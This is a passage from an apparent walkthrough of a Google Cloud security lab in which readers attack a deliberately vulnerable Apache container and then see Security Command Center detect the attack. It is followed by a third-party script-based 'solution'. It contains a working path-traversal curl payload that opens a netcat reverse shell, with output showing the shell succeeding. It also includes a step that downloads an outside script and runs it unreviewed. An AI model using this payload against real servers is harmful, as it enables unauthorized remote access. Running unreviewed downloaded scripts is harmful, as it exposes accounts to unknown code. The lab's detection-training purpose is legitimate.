![d0baa670e0d1ba6a.png](https://cdn.qwiklabs.com/WjvYlctc5bUd3wwyMGB2xSlC2T%2Bv%2BLhy1awFRpnNq3Q%3D align="left")

20. Read the description to learn more about the Finding and what has happened.
    
21. Identify the "Program binary"—note that it is the exact name of the newly added program `/tmp/nc`.
    
22. Click on the **Source Properties** tab near the top of the page.
    
23. Identify the **Pod\_Name** and **Pod\_Namespace** properties.
    

These properties will be necessary for mitigating this threat. In our environment we don't have many resources, so our investigation is very simple, but in real environments you might have thousands of pods running on the same cluster.

A more detailed process of investigating similar threats is given on the page [Added Binary Executed](https://cloud.google.com/security-command-center/docs/how-to-investigate-threats#added_binary_executed). In our case we know the primary reason for this Finding, so we will not need to do a full analysis.

24. Close the window describing the Finding.
    

To proceed you will need to open the second SSH connection to the attacker-instance virtual machine.

25. In the Google Cloud Console open the Navigation menu and select **Compute Engine &gt; VM instances.**
    
26. Click SSH to access the attacker-instance virtual machine.
    
27. Accept the authorization prompts when the new SSH window opens.
    
28. Arrange your two SSH windows side-by-side so you can easily toggle between the two:
    

![d31a87b9170c7ea.png](https://cdn.qwiklabs.com/j12xIyZ0gjdBK6qIHz2hXN6RhzFZMArojt%2Bu9dX%2FGe4%3D align="left")

29. In the newly launched terminal window (the **2nd session**), run the netcat server listening session:
    

```apache
nc -nlvp 8888
```

You should see the following message:

```apache
Listening on 0.0.0.0 8888
```

30. Toggle to **1st session**.
    
31. Run the following command to launch a reverse shell session from inside the Apache container:
    

```apache
curl "http://${NODE_IP}:${NODE_PORT}/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh" --path-as-is --insecure --data "echo Content-Type: text/plain; echo; /tmp/nc ${LOCAL_IP} 8888 -e /bin/bash"
```

This command will stay active and will block our current terminal. **Do not interrupt it**—this is normal behavior.

32. Toggle to the **2nd session**, where you have just launched the `nc -nlvp 8888` command.
    
33. In this window, ensure you see a message similar to the following:
    

```apache
Connection received on 10.8.0.9 46686
```

34. Now in the **2nd session** enter the following command:
    

```apache
ls -l /
```

35. Ensure you see the content of the root directory of our vulnerable container outputted:
    

```apache
ls -l /
total 68
drwxr-xr-x   1 root root 4096 Sep 28  2021 bin
drwxr-xr-x   2 root root 4096 Jun 13  2021 boot
drwxr-xr-x   5 root root  360 Jul 14 00:13 dev
drwxr-xr-x   1 root root 4096 Jul 14 00:13 etc
drwxr-xr-x   2 root root 4096 Jun 13  2021 home
drwxr-xr-x   1 root root 4096 Sep 28  2021 lib
drwxr-xr-x   2 root root 4096 Sep 27  2021 lib64
drwxr-xr-x   2 root root 4096 Sep 27  2021 media
drwxr-xr-x   2 root root 4096 Sep 27  2021 mnt
drwxr-xr-x   2 root root 4096 Sep 27  2021 opt
dr-xr-xr-x 193 root root    0 Jul 14 00:13 proc
drwx------   2 root root 4096 Sep 27  2021 root
drwxr-xr-x   1 root root 4096 Jul 14 00:13 run
drwxr-xr-x   2 root root 4096 Sep 27  2021 sbin
drwxr-xr-x   2 root root 4096 Sep 27  2021 srv
dr-xr-xr-x  13 root root    0 Jul 14 00:13 sys
drwxrwxrwt   1 root root 4096 Jul 14 00:41 tmp
drwxr-xr-x   1 root root 4096 Sep 27  2021 usr
drwxr-xr-x   1 root root 4096 Sep 27  2021 var
```

This means that you have successfully implemented a Reverse Shell attack. You can see, what we have just built on this diagram:

![2b0960f5f8f7ed8f.png](https://cdn.qwiklabs.com/ueafloPhuPmLibd26CmW4nzTniKejErtIG7V%2FtGrOLA%3D align="left")

* **1.** We run the `curl` command on the Attacker instance and connect to the Apache
    
* **2.** Apache launches the `/tmp/nc ${LOCAL_IP} 8888 -e /bin/bash` command using `/bin/sh` shell.
    
* **3.** The `/tmp/nc ${LOCAL_IP} 8888 -e /bin/bash` launches `/bin/bash` process
    
* **4.** The `/tmp/nc ${LOCAL_IP} 8888 -e /bin/bash` command establishes connection to the Attacker instance and redirects input and output of the `/bin/bash` to the remote `nc` process, running on the Attacker's instance
    
* **5.** The Attacker communicates with remote `/bin/bash` process interactively
    

The attacker can develop this attack further by launching possible scenarios such as:

* Defacing the website
    
* Running his/her own load in this container
    
* Fetching the token of the Service Account and using it for exploiting the associated Google Cloud environment
    

All these scenarios are out of scope of the current lab.

36. Enter **Ctrl+C** in both SSH sessions to stop running commands.
    
37. Exit out of both SSH session windows by entering the "exit" command.
    

**Note:** You can also enter **Cmnd + W** to exit out of SSH windows.

38. Return to the Google Cloud Console.
    
39. Open the navigation menu and select **Security &gt; Security Command Center &gt; Findings**.
    
40. Set the time range to **Last hour**.
    
41. Ensure you see one (or two) findings for Reverse shell:
    

![42fcfbdf871a5c50.png](https://cdn.qwiklabs.com/0bJv0PeLI3oG3zv6w2WayS0ZvyIRJLvodYOihsK%2BcHQ%3D align="left")

42. Click on the URL underneath the category section:
    

![dacfd0d73f1151a8.png](https://cdn.qwiklabs.com/GGMpx%2BqBorp2T3kTL7UHkOO95tQKCyIU%2Bc%2BB7TJTu98%3D align="left")

43. Investigate the following properties on the **Summary** tab:
    

* **Description -** explains what has happened
    
* **Destination IP -** the IP address of the host to which the connection was established
    
* **Program binary -** the binary file that initiated the reverse shell connection.
    

Note that in our case the Program binary is set to `/bin/bash`. This is because in this URL `http://${NODE_IP}:${NODE_PORT}/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh` we are referring to the program `/bin/sh`, which is actually a link inside of our container to the `/bin/bash` executable.

The `/tmp/nc` binary was simply called as a subprocess of the `/bin/bash` program and SCC detected that `/bin/bash` launched a reverse shell session to the destination IP.

44. Now click on the **Source Properties** tab and pay special attention to the properties: **Pod\_Name** and **Pod\_Namespece**.
    

Based on these values, you would be able to find a Deployment and replace the vulnerable container with a proper version.

Click **Check my progress** to verify the objective.

Exploit a web server and detect issues with Container Threat Detection

---

## Solution of Lab

### Quick Guide

%[https://youtu.be/JE2qJiPoWtg] 

```apache
curl -LO raw.githubusercontent.com/QUICK-GCP-LAB/2-Minutes-Labs-Solutions/main/Detect%20and%20Investigate%20Threats%20with%20Security%20Command%20Center/gsp1125.sh
sudo chmod +x *.sh
./*.sh
```

---

### Manual Instructions

%[https://www.youtube.com/watch?v=PaNMosjxQJw] 

To enable "**Admin Read**" logs for the **Cloud Resource Manager API**, you might need to access the **Google Cloud Console** directly. Here are the steps to do this:

Navigate to **IAM & Admin** &gt; **Audit Logs**.

In the list of services, find " `Cloud Resource Manager API` "

Click the checkbox next to "Cloud Resource Manager API" to enable "Admin Read" logs.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1724306760052/7fb02006-35c6-4ded-9142-9f1b88225d22.png align="center")

---

**Now Activate the cloud shell**

```apache
export ZONE=
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1724306303190/1dfbe337-1a89-42c4-a6c2-e5b162898963.png align="center")

```apache
gcloud services enable securitycenter.googleapis.com --project=$DEVSHELL_PROJECT_ID

sleep 15

gcloud projects add-iam-policy-binding $DEVSHELL_PROJECT_ID \
--member=user:demouser1@gmail.com --role=roles/bigquery.admin


gcloud projects remove-iam-policy-binding $DEVSHELL_PROJECT_ID \
--member=user:demouser1@gmail.com --role=roles/bigquery.admin

export PROJECT_NUMBER=$(gcloud projects describe $DEVSHELL_PROJECT_ID --format="value(projectNumber)")

gcloud projects add-iam-policy-binding $DEVSHELL_PROJECT_ID \
  --member=user:$USER_EMAIL \
  --role=roles/cloudresourcemanager.projectIamAdmin


gcloud compute instances create instance-1 --project=$DEVSHELL_PROJECT_ID --zone=$ZONE --machine-type=e2-medium --network-interface=network-tier=PREMIUM,stack-type=IPV4_ONLY,subnet=default --metadata=enable-oslogin=true --maintenance-policy=MIGRATE --provisioning-model=STANDARD --scopes=https://www.googleapis.com/auth/cloud-platform --create-disk=auto-delete=yes,boot=yes,device-name=instance-1,image=projects/debian-cloud/global/images/debian-11-bullseye-v20230912,mode=rw,size=10,type=projects/$DEVSHELL_PROJECT_ID/zones/$ZONE/diskTypes/pd-balanced --no-shielded-secure-boot --shielded-vtpm --shielded-integrity-monitoring --labels=goog-ec-src=vm_add-gcloud --reservation-affinity=any

gcloud dns --project=$DEVSHELL_PROJECT_ID policies create dns-test-policy --description="Please like share & subscirbe to quicklab" --networks="default" --alternative-name-servers="" --private-alternative-name-servers="" --no-enable-inbound-forwarding --enable-logging
```

```apache
gcloud compute ssh --zone "$ZONE" "instance-1" --tunnel-through-iap --project "$DEVSHELL_PROJECT_ID" --quiet --command "gcloud projects get-iam-policy \$(gcloud config get project) && curl etd-malware-trigger.goog"
```

<div data-node-type="callout">
<div data-node-type="callout-emoji">💡</div>
<div data-node-type="callout-text">Check the score for <strong>task 2</strong> do not move ahead until you get score</div>
</div>

---

```apache
gcloud compute instances delete instance-1 --zone=$ZONE --quiet

gcloud compute instances create attacker-instance \
--scopes=cloud-platform  \
--zone=$ZONE \
--machine-type=e2-medium  \
--image-family=ubuntu-2004-lts \
--image-project=ubuntu-os-cloud \
--no-address


gcloud compute networks subnets update default \
--region="${ZONE%-*}" \
--enable-private-ip-google-access
```

---

*Go to attacker-instance vm and click on ssh button*

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1724306773432/4507782e-4e53-48af-8676-0173db93936c.png align="center")

```apache
export ZONE=
```

```apache
export AUTHORIZED_NETWORK=
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1724307175151/f26695bc-6efa-4892-a64a-23af1ad7bf4e.png align="center")

```apache
sudo snap remove google-cloud-cli

curl -O https://dl.google.com/dl/cloudsdk/channels/rapid/downloads/google-cloud-cli-438.0.0-linux-x86_64.tar.gz

tar -xf google-cloud-cli-438.0.0-linux-x86_64.tar.gz

./google-cloud-sdk/install.sh
```

When prompted to help improve the Google Cloud CLI, enter **<mark>N</mark>**.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1724306541826/b9ece840-a1b6-4f7b-beb0-da732b316cc5.png align="center")

When prompted to modify your profile to update your $PATH, enter **<mark>Y</mark>**

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1724306571274/71389a3c-a12b-4478-94e1-d17283646368.png align="center")

Press **<mark>Enter</mark>** to use the standard rc file location.

```apache
. ~/.bashrc

gcloud components install kubectl gke-gcloud-auth-plugin --quiet

REGION="${ZONE%-*}"

# Create the GKE cluster
gcloud container clusters create test-cluster \
  --zone "$ZONE" \
  --enable-private-nodes \
  --enable-private-endpoint \
  --enable-ip-alias \
  --num-nodes=1 \
  --master-ipv4-cidr "172.16.0.0/28" \
  --enable-master-authorized-networks \
  --master-authorized-networks "$AUTHORIZED_NETWORK"
```

```apache
kubectl describe daemonsets container-watcher -n kube-system
```

It will take a few minutes for an output to be generated. If you get a message similar to the following:

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1724307536242/3c63a722-b263-4edc-8e6b-19f601166053.png align="center")

Wait a moment and rerun the command. **After a few minutes**, you should receive the following output:

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1724307835383/3567d1b5-3929-4dd6-bf0a-c326ba53b999.png align="center")

<div data-node-type="callout">
<div data-node-type="callout-emoji">💡</div>
<div data-node-type="callout-text">IF you didn't get a output re-run the above command again and again until you get output .</div>
</div>

---

**Once you get a output then only run the below commands and it's might task 15 minutes to show the output so kindly wait.**

```apache
kubectl create deployment apache-deployment \
--replicas=1 \
--image=us-central1-docker.pkg.dev/cloud-training-prod-bucket/scc-labs/ktd-test-httpd:2.4.49-vulnerable

kubectl expose deployment apache-deployment \
--name apache-test-service  \
--type NodePort \
--protocol TCP \
--port 80


NODE_IP=$(kubectl get nodes -o jsonpath={.items[0].status.addresses[0].address})
NODE_PORT=$(kubectl get service apache-test-service \
-o jsonpath={.spec.ports[0].nodePort})


gcloud compute firewall-rules create apache-test-service-fw \
--allow tcp:${NODE_PORT}

gcloud compute firewall-rules create apache-test-rvrs-cnnct-fw --allow tcp:8888
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1724308135784/b1f78994-44e1-4fa8-a812-130b6d018c95.png align="center")

**Perform task 5 using lab instruction page commands**

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1724307327728/d17a359f-3a9c-4875-858a-454325a39297.png align="center")

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1724308575704/49490363-f3cd-4c82-b34d-f615d5e47544.png align="center")